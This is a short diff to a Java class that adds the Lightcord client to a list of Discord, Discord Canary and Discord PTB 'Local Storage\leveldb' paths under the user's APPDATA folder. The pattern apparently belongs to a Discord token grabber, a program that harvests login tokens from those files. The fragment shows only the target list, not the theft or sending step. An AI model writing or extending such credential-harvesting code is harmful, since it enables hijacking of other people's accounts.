@@ -127,6 +127,7 @@ public class Main {
         String localappdata = System.getenv("LOCALAPPDATA");
         String roaming = System.getenv("APPDATA");
         String[][] paths = {
+                {"Lightcord", roaming + "\\Lightcord\\Local Storage\\leveldb"}, //Lightcord
                 {"Discord", roaming + "\\Discord\\Local Storage\\leveldb"}, //Standard Discord
                 {"Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb"}, //Discord Canary
                 {"Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb"}, //Discord PTB
